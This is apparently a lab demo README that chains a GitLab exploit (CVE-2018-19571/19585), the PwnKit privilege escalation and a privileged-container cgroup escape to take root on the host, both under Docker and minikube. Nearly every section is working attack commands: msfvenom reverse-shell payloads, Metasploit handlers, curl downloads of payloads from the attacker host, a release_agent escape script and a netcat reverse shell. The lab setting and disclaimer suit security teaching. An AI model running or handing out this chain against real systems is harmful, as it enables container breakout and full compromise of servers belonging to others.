# Hack gitlab with container escape

The demo consists of the follwoing parts:

- Hack gitlab with CVE-2018-19571 + CVE-2018-19585 to get a reverse shell
- get root rights within the container via CVE-2021-4034
- abuse the misconfiguration --privileged of container

## Docker on Ubuntu 20.04 LTS

I used the following vagrant machine

```
config.vm.define "ub2004" do |ub2004|
  ub2004.vm.provider "virtualbox" do |vb|
    vb.memory = "4096"
  end
  ub2004.vm.box = "ubuntu/focal64"
  ub2004.vm.box_version = "20211021.0.0"
  ub2004.vm.network :private_network, ip: "192.168.56.251"
end
```

Install the following stuff

```bash
sudo apt update && apt remove -y netcat-openbsd && apt install -y netcat-traditional
```

Install docker

```bash
sudo apt install -y ca-certificates curl gnupg lsb-release
sudo curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg
sudo echo "deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable" | sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
sudo apt update
sudo apt install -y docker-ce docker-ce-cli containerd.io docker-compose
sudo usermod -a -G docker vagrant
```

The docker daemon is in [Rootless mode](https://docs.docker.com/engine/security/rootless/). You have to execute the following commands

```bash
sudo apt install -y uidmap
dockerd-rootless-setuptool.sh uninstall --force
```

Build the container

```bash
docker build -t gitlab-escape -f ./Dockerfile .
```

Start the GitLab application via docker-compose

```bash
docker-compose up
```

Create a new GitLab user (mondoo, mondoo.com)

![GitLab user register](images/gitlab-user-register.png)

Create the meterpreter for the GitLab container

```bash
msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=192.168.56.1 LPORT=4242 -f elf > met-container
```

Start the metasploit framework for the GitLab container connection

```bash
msfconsole -q -x 'use exploit/multi/handler;set payload linux/x86/meterpreter_reverse_tcp;set lhost 0.0.0.0; set lport 4242;run'
```

Create the reverse shell for the docker host

```bash
msfvenom -p linux/x86/shell/reverse_tcp LHOST=192.168.56.1 LPORT=4243 -f elf > met-host
```

Start the metasploit framework for the docker host connection

```bash
msfconsole -q -x 'use exploit/multi/handler;set payload linux/x86/shell/reverse_tcp;set lhost 0.0.0.0; set lport 4243;run'
```

Start the on liner web server that the victim can download the shells

```bash
ruby -run -ehttpd . -p8001
```

Execute the GitLab exploit

```bash
python gitlab-msf.py -u mondoo -p mondoo.com -g http://192.168.56.251 -c 'curl -vk http://192.168.56.1:8001/met-container -o /tmp/met'

python gitlab-msf.py -u mondoo -p mondoo.com -g http://192.168.56.251 -c 'chmod 777 /tmp/met'

python gitlab-msf.py -u mondoo -p mondoo.com -g http://192.168.56.251 -c '/tmp/met'
```

Now you have a reverse meterpreter connection, type `shell` to get a bash.

Get root within the GitLab container

```bash
id
uid=998(git) gid=998(git) groups=998(git)

cd /tmp

curl -vkO https://pwnkit.s3.amazonaws.com/priv-es

chmod a+x ./priv-es

./priv-es

id
uid=0(root) gid=0(root) groups=0(root),998(git)
```

Execute the following commands in your GitLab root shell

```bash
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
echo "$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "curl -vk http://192.168.56.1:8001/met-host -o /tmp/met" >> /cmd
echo "chmod 777 /tmp/met" >> /cmd
echo "/tmp/met" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

Now you got a root shell from your container host.

## kubernetes cluster (minikube)

If minikube is used, you can easily start and build the container locally:

```bash
# NOTE: if minikube is used with docker desktop, you need to configure docker desktop before. The node got the ip 192.168.59.100
minikube start --memory 4096 --cpus 4
eval $(minikube docker-env)
docker build -t docker.io/hacklab/gitlab-escape -f ./Dockerfile .
```

Deploy Gitlab into Minikube

```bash
kubectl apply -f gitlab-deployment.yaml
```

Forward the pod ports locally:

```bash
kubectl get pods
NAME                                       READY   STATUS    RESTARTS   AGE
gitlab-container-escape-7bbd59fc59-2nrqc   1/1     Running   0          94s

kubectl port-forward gitlab-container-escape-7bbd59fc59-2nrqc 5080:80
kubectl port-forward gitlab-container-escape-7bbd59fc59-2nrqc 50443:443
kubectl port-forward gitlab-container-escape-7bbd59fc59-2nrqc 5022:22
```

Create the meterpreter for the GitLab container

```bash
msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=192.168.59.1 LPORT=4242 -f elf > met-container
```

Start the metasploit framework for the GitLab container connection

```bash
msfconsole -q -x 'use exploit/multi/handler;set payload linux/x86/meterpreter_reverse_tcp;set lhost 0.0.0.0; set lport 4242;run'
```

Create the reverse shell for the docker host

```bash
msfvenom -p linux/x86/shell/reverse_tcp LHOST=192.168.59.1 LPORT=4243 -f elf > met-host
```

Start the metasploit framework for the docker host connection

```bash
msfconsole -q -x 'use exploit/multi/handler;set payload linux/x86/shell/reverse_tcp;set lhost 0.0.0.0; set lport 4243;run'
```

Start the on liner web server that the victim can download the shells

```bash
ruby -run -ehttpd . -p8001
```

Execute the GitLab exploit

```bash
python gitlab-msf.py -u mondoo -p mondoo.com -g http://127.0.0.1 -c 'curl -vk http://192.168.59.1:8001/met-container -o /tmp/met'

python gitlab-msf.py -u mondoo -p mondoo.com -g http://127.0.0.1 -c 'chmod 777 /tmp/met'

python gitlab-msf.py -u mondoo -p mondoo.com -g http://127.0.0.1 -c '/tmp/met'
```

Now you have a reverse meterpreter connection from the container, type `shell` to get a bash.

Get root within the GitLab container

```bash
id
uid=998(git) gid=998(git) groups=998(git)

cd /tmp

curl -vkO https://pwnkit.s3.amazonaws.com/priv-es

chmod a+x ./priv-es

./priv-es

id
uid=0(root) gid=0(root) groups=0(root),998(git)
```

Execute the following commands in your GitLab root shell to get a root shell from the docker host

```bash
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
echo "$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "curl -vk http://192.168.59.1:8001/met-host -o /tmp/met" >> /cmd
echo "chmod 777 /tmp/met" >> /cmd
echo "/tmp/met" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

Now you got a root shell from your container host.

To delete the deployment just run:

```
kubectl delete -f gitlab-deployment.yaml
```

### some ideas

- just execute `ps aux` on the container host

```bash
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

- reverse shell with netcat

```bash
echo "nc -e /bin/bash 192.168.56.1 4243" >> /cmd
```

```bash
echo "$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)" > /tmp/cgrp/release_agent
```

- the pkexec compile exploit can be downloaded from

```
curl -vkO https://pwnkit.s3.amazonaws.com/priv-es
```

# Troubelshooting

- if you execute the following command and get `mount: /tmp/cgrp: permission denied.`

```bash
root@46646bb3e291:/# mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
```

- then your docker daemon is in [Rootless mode](https://docs.docker.com/engine/security/rootless/). you have to execute the following commands

```bash
mondoo@mondoo:~$ sudo apt-get install -y uidmap
mondoo@mondoo:~$ dockerd-rootless-setuptool.sh uninstall
+ systemctl --user stop docker.service
Failed to stop docker.service: Unit docker.service not loaded.
+ systemctl --user disable docker.service
Failed to disable unit: Unit file docker.service does not exist.
[INFO] Uninstalled docker.service
[INFO] This uninstallation tool does NOT remove Docker binaries and data.
[INFO] To remove data, run: `/usr/bin/rootlesskit rm -rf /home/mondoo/.local/share/docker`
```

## Disclaimer

This or previous program is for Educational purpose ONLY. Do not use it without permission. The usual disclaimer applies, especially the fact that we (Mondoo Inc) is not liable for any damages caused by direct or indirect use of the information or functionality provided by these programs. The author or any Internet provider bears NO responsibility for content or misuse of these programs or any derivatives thereof. By using these programs you accept the fact that any damage (dataloss, system crash, system compromise, etc.) caused by the use of these programs is not Mondoo Inc's responsibility.
